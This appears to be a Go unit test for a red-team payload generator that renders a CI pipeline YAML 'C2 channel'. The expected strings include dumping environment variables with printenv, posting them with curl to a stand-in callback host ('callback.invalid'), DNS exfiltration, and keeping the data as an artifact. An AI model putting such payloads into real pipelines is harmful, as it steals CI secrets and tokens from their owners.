package payloads

import (
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

func TestGenerateC2ChannelYAML_ExfilsAndRetainsCollectedData(t *testing.T) {
	t.Parallel()

	rendered := GenerateC2ChannelYAML(C2ChannelOptions{
		ExfilMethod: "dns-a",
		ExfilTarget: "exfil.invalid",
		CallbackURL: "http://callback.invalid/exfil",
	})
	for _, want := range []string{
		"printenv | sort",
		"--data-binary @\"$_cdir/c2-data.env\"",
		"http://callback.invalid/exfil",
		"cp \"$_cdir/c2-data.env\" ./c2-channel-data.env",
		"paths:\n      - c2-channel-data.env",
	} {
		if !strings.Contains(rendered, want) {
			t.Fatalf("generated payload missing %q:\n%s", want, rendered)
		}
	}

	var document any
	if err := yaml.Unmarshal([]byte(rendered), &document); err != nil {
		t.Fatalf("generated payload is invalid YAML: %v", err)
	}
}
